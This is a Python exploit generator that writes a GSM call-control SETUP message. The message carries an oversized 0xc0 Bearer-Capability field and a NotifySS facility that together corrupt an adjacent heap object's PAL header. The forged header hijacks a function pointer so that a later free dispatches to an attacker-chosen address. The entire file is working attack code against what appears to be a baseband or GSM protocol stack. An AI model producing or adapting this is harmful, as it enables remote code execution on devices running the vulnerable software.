#!/usr/bin/env python3
"""Build a single stock-gsm_cc SETUP with a forged successor PAL header.

The accepted NotifySS Invoke (operation 0x10, SS code 0x21) makes the stock
CC path allocate a short-lived ASN object immediately after the vulnerable
buffer.  A 0xc0 Bearer-Capability copy reaches that object's PAL header.  Its
forged free performs the subtract; the next ordinary PAL free then dispatches
through the selected target.
"""

from pathlib import Path
import struct
import sys

from exploit_gen import FREE_PTR_ADDR, FREE_PTR_VALUE, setup_pdu, forge_header


def notify_ss(code=0x21):
    argument = bytes((0x30, 0x03, 0x81, 0x01, code))
    content = bytes.fromhex("02 01 01 02 01 10") + argument
    return bytes((0xa1, len(content))) + content


def build(target, bc_len=0xc0):
    successor, delta, owner = forge_header(FREE_PTR_ADDR, target,
                                            cur_value=FREE_PTR_VALUE)
    # Type 1/size 0/link 1 exercises the cheap single-word guard check and
    # returns still-linked, while the copy's 0xc0 span reaches this header.
    pdu = bytearray(setup_pdu(bc_len, {
        0x60: successor,
    }))
    facility = notify_ss()
    pdu.extend((0x1c, len(facility)))
    pdu.extend(facility)
    return bytes(pdu), delta, owner


def main(argv):
    if len(argv) < 2:
        raise SystemExit("usage: make_stock_forge.py OUT [TARGET]")
    out = Path(argv[1])
    target = int(argv[2], 0) if len(argv) > 2 else FREE_PTR_VALUE
    bc_len = int(argv[3], 0) if len(argv) > 3 else 0xc0
    pdu, delta, owner = build(target, bc_len)
    out.write_bytes(pdu)
    print(f"{out}: {len(pdu)} bytes target=0x{target:08x} "
          f"delta=0x{delta:08x} owner=0x{owner:08x}")
    print(f"header at chunk offset 0x60; BC length=0x{bc_len:02x}")


if __name__ == "__main__":
    main(sys.argv)
